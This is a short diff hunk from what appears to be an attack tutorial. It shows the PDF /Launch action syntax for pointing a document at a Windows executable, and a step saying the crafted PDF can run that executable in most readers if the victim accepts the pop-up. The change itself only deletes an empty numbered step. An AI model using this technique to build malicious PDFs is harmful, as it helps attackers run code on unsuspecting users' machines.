@@ -17,7 +17,6 @@ How to execute this attack:
   /S /Launch
   /Win << /F (c:\\(filepath to the executable).exe >> >>
  7) After replacing the two portions of the code, you should have a pdf that is capable of executing an executable on most pdf readers, you will have to hope that the user does not read the pop up and just willingly accepts.
- 8) 
 
 
 Relevant Material:
